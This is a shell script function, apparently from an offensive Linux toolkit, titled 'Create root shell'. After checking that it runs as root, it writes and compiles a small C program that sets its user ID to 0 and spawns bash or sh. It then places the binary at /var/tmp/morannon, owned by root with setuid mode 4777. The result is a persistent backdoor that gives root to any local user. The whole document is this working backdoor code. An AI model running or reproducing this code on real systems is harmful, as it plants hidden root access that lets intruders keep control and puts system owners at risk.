#####################
# Create root shell #
#####################

root_shell() {

if [ ! "$QUIET" ]; then echo "
   ____                _         ____             _     ____  _          _ _ 
  / ___|_ __ ___  __ _| |_ ___  |  _ \ ___   ___ | |_  / ___|| |__   ___| | |
 | |   | '__/ _ \/ _\` | __/ _ \ | |_) / _ \ / _ \| __| \___ \| '_ \ / _ \ | |
 | |___| | |  __/ (_| | ||  __/ |  _ < (_) | (_) | |_   ___) | | | |  __/ | |
  \____|_|  \___|\__,_|\__\___| |_| \_\___/ \___/ \__| |____/|_| |_|\___|_|_|
                                                                            
"
fi

# check for root
if [ ! "$IAMROOT" ]; then fuERROR "Aborting! Not root. Try \"sudo sh $0\"" && echo && exit; fi

TMPDIR="/var/tmp"
GCC=$(command -v gcc 2>/dev/null)
CHOWN=$(command -v chown 2>/dev/null)
CHMOD=$(command -v chmod 2>/dev/null)

# check if gcc exists
if [ "$GCC" ]; then echo "$GCC exists"; else fuERROR "gcc missing on this host, try to install it..."; fi

# check if /bin/bash exists
if [ -f "/bin/bash" ]; then BASH="1"; else BASH=""; fi

fuTITLE "Trying to add a shell as a binary with suid bit set ..."
sleep 2
if [ "$BASH" ]; then
  echo 'int main(void){setresuid(0, 0, 0);system("/bin/bash");}' > $TMPDIR/morannon.c
else
  echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR/morannon.c
fi
if $GCC $TMPDIR/morannon.c -o $TMPDIR/morannon 2>/dev/null; then
  fuMESSAGE "root shell \"$TMPDIR/morannon\" created"
else
  fuERROR "root shell not created"
fi
rm $TMPDIR/morannon.c
if $CHOWN root:root $TMPDIR/morannon && $CHMOD 4777 $TMPDIR/morannon; then
  ROOTSHELLOK="1" && fuINFO "root shell \"$TMPDIR/morannon\" usable"
else
  ROOTSHELLOK="" && fuERROR "root shell not usable"
fi

}